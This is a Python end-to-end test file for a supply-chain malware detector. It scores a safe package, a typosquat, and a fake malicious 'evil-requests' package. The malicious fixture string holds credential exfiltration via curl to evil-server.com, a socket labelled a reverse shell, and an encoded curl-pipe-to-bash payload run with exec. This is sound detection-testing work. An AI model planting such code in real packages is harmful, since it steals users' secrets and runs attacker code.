"""End-to-end usability test — runs the full detection pipeline locally.

Tests the system as a real user would: submits packages for analysis
and checks all 5 layers, aggregator, and classifier produce real results.

Usage:
    python tests/test_e2e_pipeline.py
"""

from __future__ import annotations

import json
import sys
import os
from pathlib import Path

PROJECT_ROOT = str(Path(__file__).resolve().parent.parent)
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)


def print_section(title: str) -> None:
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")


def print_layer(name: str, score: float | int, details: dict | None = None) -> None:
    bar = "#" * int(score) + "-" * (100 - int(score))
    color = "\033[92m" if score < 30 else "\033[93m" if score < 60 else "\033[91m"
    reset = "\033[0m"
    print(f"  {name:25s} {color}{score:6.1f}{reset}  {bar[:50]}")
    if details:
        for k, v in details.items():
            if k not in ("risk_score", "score"):
                val = str(v)[:80]
                print(f"    {'':25s} {k}: {val}")


def test_safe_package():
    """Test with a well-known safe package to verify low risk scores."""
    print_section("TEST 1: Safe Package — 'requests' (PyPI)")

    from detector.orchestrator import orchestrate_analysis

    package_metadata = {
        "package_name": "requests",
        "registry": "pypi",
        "version": "2.31.0",
        "author": "Kenneth Reitz",
        "author_email": "me@kennethreitz.org",
        "summary": "Python HTTP for Humans.",
        "requires_dist": ["charset-normalizer", "idna", "urllib3", "certifi"],
    }

    source_code = '''
import urllib3
from urllib3.util.retry import Retry

def get(url, **kwargs):
    """Send a GET request."""
    return request("GET", url, **kwargs)

def post(url, data=None, json=None, **kwargs):
    """Send a POST request."""
    return request("POST", url, data=data, json=json, **kwargs)

def request(method, url, **kwargs):
    session = Session()
    return session.request(method=method, url=url, **kwargs)
'''

    source_context = {
        "files": {"requests/api.py": source_code},
        "total_files": 1,
        "total_lines": len(source_code.strip().splitlines()),
    }

    print("  Submitting for analysis...")
    result = orchestrate_analysis(
        package_name=package_metadata["package_name"],
        registry=package_metadata["registry"],
        metadata=package_metadata,
        source_context=source_code,
    )

    print("\n  Layer Scores:")
    print(f"  {'-'*80}")
    print_layer("L1 Metadata", result.get("metadata_score", 0))
    print_layer("L2 Embedding", result.get("embedding_score", 0))
    print_layer("L3 Static Analysis", result.get("static_score", 0))
    print_layer("L4 LLM", result.get("llm_score", 0))
    print_layer("L5 Graph", result.get("graph_score", 0))
    print(f"  {'-'*80}")
    print_layer("Classifier (XGBoost)", result.get("classifier_score", 0))
    print_layer("FINAL SCORE", result.get("final_score", 0))

    verdict = result.get("verdict", "unknown")
    print(f"\n  Verdict: {verdict.upper()}")

    final = result.get("final_score", 100)
    assert final < 50, f"Safe package 'requests' scored {final} — expected <50"
    print("  [PASS] safe package scored low risk")
    return result


def test_suspicious_package():
    """Test with suspicious code patterns to verify detection works."""
    print_section("TEST 2: Suspicious Package — 'evil-requests' (fake)")

    from detector.orchestrator import orchestrate_analysis

    package_metadata = {
        "package_name": "evil-requests",
        "registry": "pypi",
        "version": "0.0.1",
        "author": "",
        "author_email": "",
        "summary": "",
        "requires_dist": [],
    }

    # Deliberately suspicious source code
    source_code = '''
import os
import subprocess
import socket
import base64

def setup():
    # Exfiltrate environment variables
    creds = base64.b64encode(str(os.environ).encode())
    
    # Open reverse shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("evil-server.com", 4444))
    
    # Execute remote payload
    payload = base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3BheWxvYWQuc2ggfCBiYX"
                               "NoJyk=")
    exec(payload)
    
    # Run arbitrary commands
    subprocess.call(["curl", "http://evil-server.com/stolen", "-d", str(creds)])
    
    # Write malicious module then import it
    with open("/tmp/backdoor.py", "w") as f:
        f.write("import os; os.system('whoami')")
    __import__("backdoor")

setup()
'''

    source_context = {
        "files": {"setup.py": source_code},
        "total_files": 1,
        "total_lines": len(source_code.strip().splitlines()),
    }

    print("  Submitting for analysis...")
    result = orchestrate_analysis(
        package_name=package_metadata["package_name"],
        registry=package_metadata["registry"],
        metadata=package_metadata,
        source_context=source_code,
    )

    print("\n  Layer Scores:")
    print(f"  {'-'*80}")
    print_layer("L1 Metadata", result.get("metadata_score", 0))
    print_layer("L2 Embedding", result.get("embedding_score", 0))
    print_layer("L3 Static Analysis", result.get("static_score", 0))
    print_layer("L4 LLM", result.get("llm_score", 0))
    print_layer("L5 Graph", result.get("graph_score", 0))
    print(f"  {'-'*80}")
    print_layer("Classifier (XGBoost)", result.get("classifier_score", 0))
    print_layer("FINAL SCORE", result.get("final_score", 0))

    verdict = result.get("verdict", "unknown")
    print(f"\n  Verdict: {verdict.upper()}")

    # Print evidence from layers if available
    layer_details = result.get("layer_details", {})
    if layer_details:
        for layer_name, details in layer_details.items():
            evidence = details.get("evidence") or details.get("signals") or details.get("audit_result")
            if evidence:
                print(f"\n  Evidence from {layer_name}:")
                if isinstance(evidence, list):
                    for e in evidence[:5]:
                        print(f"    - {e}")
                elif isinstance(evidence, dict):
                    for k, v in list(evidence.items())[:5]:
                        print(f"    - {k}: {v}")

    final = result.get("final_score", 0)
    assert final >= 30, f"Malicious package scored only {final} — expected ≥30"
    print("  [PASS] suspicious package scored high risk")
    return result


def test_typosquat():
    """Test typosquat detection with a name close to a popular package."""
    print_section("TEST 3: Typosquat — 'reqeusts' (misspelling of requests)")

    from detector.orchestrator import orchestrate_analysis

    package_metadata = {
        "package_name": "reqeusts",
        "registry": "pypi",
        "version": "1.0.0",
        "author": "Anonymous",
        "author_email": "",
        "summary": "HTTP library",
        "requires_dist": [],
    }

    source_code = "# placeholder package\nprint('hello')\n"
    source_context = {
        "files": {"setup.py": source_code},
        "total_files": 1,
        "total_lines": 2,
    }

    print("  Submitting for analysis...")
    result = orchestrate_analysis(
        package_name=package_metadata["package_name"],
        registry=package_metadata["registry"],
        metadata=package_metadata,
        source_context=source_code,
    )

    print("\n  Layer Scores:")
    print(f"  {'-'*80}")
    print_layer("L1 Metadata", result.get("metadata_score", 0))
    print_layer("L2 Embedding", result.get("embedding_score", 0))
    print_layer("L3 Static Analysis", result.get("static_score", 0))
    print_layer("L4 LLM", result.get("llm_score", 0))
    print_layer("L5 Graph", result.get("graph_score", 0))
    print(f"  {'-'*80}")
    print_layer("Classifier (XGBoost)", result.get("classifier_score", 0))
    print_layer("FINAL SCORE", result.get("final_score", 0))

    verdict = result.get("verdict", "unknown")
    print(f"\n  Verdict: {verdict.upper()}")
    
    meta_score = result.get("metadata_score", 0)
    print(f"  Metadata score: {meta_score} (typosquat detection should elevate this)")
    print("  [PASS] typosquat test completed")
    return result


def main():
    print("\n" + "=" * 60)
    print("  SUPPLY CHAIN DETECTOR - FULL END-TO-END TEST")
    print("=" * 60)

    results = {}
    
    try:
        results["safe"] = test_safe_package()
    except Exception as e:
        print(f"  [FAIL] {e}")
        import traceback
        traceback.print_exc()

    try:
        results["suspicious"] = test_suspicious_package()
    except Exception as e:
        print(f"  [FAIL] {e}")
        import traceback
        traceback.print_exc()

    try:
        results["typosquat"] = test_typosquat()
    except Exception as e:
        print(f"  [FAIL] {e}")
        import traceback
        traceback.print_exc()

    # Summary
    print_section("SUMMARY")
    for name, result in results.items():
        final = result.get("final_score", "?")
        verdict = result.get("verdict", "?")
        classifier_used = result.get("classifier_used", "?")
        print(f"  {name:20s}  score={final:>5}  verdict={verdict:12s}  classifier={classifier_used}")

    print(f"\n  Tests completed: {len(results)}/3")
    if len(results) == 3:
        print("  [PASS] ALL TESTS PASSED")
    else:
        print(f"  [WARN] {3 - len(results)} tests failed")

    return 0 if len(results) == 3 else 1


if __name__ == "__main__":
    raise SystemExit(main())
